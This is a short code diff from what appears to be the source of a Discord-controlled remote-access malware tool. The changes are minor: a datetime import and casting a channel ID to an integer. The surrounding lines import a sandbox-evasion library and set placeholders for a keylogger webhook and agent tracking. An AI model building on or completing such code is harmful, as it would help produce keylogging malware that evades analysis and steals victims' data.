@@ -2,7 +2,7 @@
 import discord
 from discord.ext import commands
 
-import datetime
+from datetime import datetime
 
 from libraries import sandboxevasion, maciassdopia
 
@@ -13,7 +13,7 @@ from libraries import sandboxevasion, maciassdopia
 
 
 GUILD = discord.Object(id = "{GUILD}")
-CHANNEL = "{CHANNEL}"
+CHANNEL = int("{CHANNEL}")
 KEYLOG_WEBHOOK = "{KEYLOG_WEBHOOK}"
 CURRENT_AGENT = 0
 
